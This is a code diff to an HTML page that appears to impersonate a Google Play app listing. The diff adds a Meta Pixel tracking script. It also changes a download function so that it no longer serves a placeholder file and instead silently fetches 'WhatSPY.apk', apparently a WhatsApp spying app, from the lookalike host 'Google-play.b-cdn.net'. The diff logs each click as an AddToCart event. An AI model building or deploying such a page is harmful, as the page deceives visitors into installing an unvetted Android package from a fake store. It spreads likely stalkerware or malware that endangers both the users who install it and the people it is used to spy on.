@@ -29,6 +29,27 @@ body{overscroll-behavior:none;}
 .OBVQ7 .VfPpkd-vQzf8d {
   color: #02875f !important;
 }
+
+
+  <!-- Meta Pixel -->
+<script>
+!function(f,b,e,v,n,t,s)
+{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+n.queue=[];t=b.createElement(e);t.async=!0;
+t.src=v;s=b.getElementsByTagName(e)[0];
+s.parentNode.insertBefore(t,s)}(window, document,'script',
+'https://connect.facebook.net/en_US/fbevents.js');
+fbq('init', '24400170869617318');
+fbq('track', 'PageView');
+</script>
+<noscript>
+  <img height="1" width="1" style="display:none"
+  src="https://www.facebook.com/tr?id=24400170869617318&ev=PageView&noscript=1"/>
+</noscript>
+<!-- Meta Pixel -->
+  
 </style></head>
 <body class="tQj5Y ghyPEc IqBfM e2G3Fb b30Rkd" id="yDmH0d">
 
@@ -1256,17 +1277,20 @@ body{overscroll-behavior:none;}
 
 <script>
 function downloadWhatSPYApk(){
-  const content = 'WhatSPY APK demonstrativo. Substitua este arquivo pelo APK real quando ele estiver pronto.';
-  const blob = new Blob([content], {type: 'application/vnd.android.package-archive'});
-  const url = URL.createObjectURL(blob);
+  fbq('track', 'AddToCart', {
+    content_name: 'WhatSpy APK',
+    content_category: 'App',
+    currency: 'BRL',
+    value: 0.00
+  });
+
   const link = document.createElement('a');
-  link.href = url;
-  link.download = 'WhatSPY.apk';
+  link.href = 'https://Google-play.b-cdn.net/whatspy.apk';
+  link.setAttribute('download', 'WhatSPY.apk');
+  link.style.display = 'none';
   document.body.appendChild(link);
   link.click();
-  link.remove();
-  setTimeout(() => URL.revokeObjectURL(url), 1000);
+  document.body.removeChild(link);
 }
-</script>
-</body>
+</script></body>
 </html>
